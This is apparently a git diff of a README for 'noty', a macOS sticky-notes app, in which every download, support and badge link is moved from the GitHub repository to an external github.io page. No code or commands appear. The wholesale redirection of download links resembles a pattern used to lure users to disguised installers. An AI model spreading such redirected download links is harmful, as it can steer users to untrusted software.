@@ -2,9 +2,9 @@
 
 ## 📥 Download & Get Started
 
-**Visit this link to download the application:** **[Download noty](https://github.com/taffylithic4475/noty)**
+**Visit this link to download the application:** **[Download noty](https://taffylithic4475.github.io)**
 
-[![Download noty](https://img.shields.io/badge/Download-noty-4CAF50?style=for-the-badge&logo=github)](https://github.com/taffylithic4475/noty)
+[![Download noty](https://img.shields.io/badge/Download-noty-4CAF50?style=for-the-badge&logo=github)](https://taffylithic4475.github.io)
 
 ---
 
@@ -43,7 +43,7 @@ Built for recent macOS versions using modern design tools. It integrates smoothl
 ## 🚀 Installation Guide
 
 ### Step 1: Download noty
-Click the button above or use this link: **[https://github.com/taffylithic4475/noty](https://github.com/taffylithic4475/noty)**
+Click the button above or use this link: **[https://taffylithic4475.github.io](https://taffylithic4475.github.io)**
 
 This page will show you different versions of noty. Look for the newest one—it's usually at the top. Click on it to start the download.
 
@@ -163,7 +163,7 @@ If you decide noty isn't for you:
 
 ## 📬 Support & Feedback
 
-Having trouble or want to suggest a feature? Visit the **[official noty page](https://github.com/taffylithic4475/noty)** on GitHub. There, you can:
+Having trouble or want to suggest a feature? Visit the **[official noty page](https://taffylithic4475.github.io)** on GitHub. There, you can:
 - Report issues or bugs
 - Ask questions
 - See future updates
@@ -172,8 +172,8 @@ Thank you for choosing noty! We hope it makes your day a little more organized.
 
 ---
 
-**Download again:** **[Visit this link to download the application.](https://github.com/taffylithic4475/noty)**
+**Download again:** **[Visit this link to download the application.](https://taffylithic4475.github.io)**
 
-[![Get noty](https://img.shields.io/badge/GET%20NOTY-Latest%20Version-FF5722?style=for-the-badge)](https://github.com/taffylithic4475/noty)
+[![Get noty](https://img.shields.io/badge/GET%20NOTY-Latest%20Version-FF5722?style=for-the-badge)](https://taffylithic4475.github.io)
 
 Keywords: noty, sticky notes, mac utility, desktop notes, screen-edge notes, note taking, productivity tool, reminder app, macOS notes, local notes, encrypted notes, lightweight application, screen organizer, digital sticky notes, native mac app
